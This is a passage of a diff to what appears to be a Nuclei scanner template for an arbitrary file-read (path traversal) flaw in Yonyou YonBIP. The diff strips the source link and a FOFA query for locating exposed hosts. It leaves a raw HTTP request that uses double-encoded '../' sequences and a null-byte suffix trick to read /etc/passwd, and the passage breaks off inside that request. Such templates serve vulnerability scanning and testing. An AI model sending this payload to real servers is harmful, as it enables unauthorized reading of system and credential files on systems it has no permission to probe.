@@ -3,12 +3,8 @@ info:
   name: 用友YonBIP高级版yonbiplogin任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ng08v815aa8al9kd'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ng08v815aa8al9kd
-    fofa: title="数字化工作台" || title="YonBIP"
 http:
 - raw:
   - 'GET /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js HTTP/2
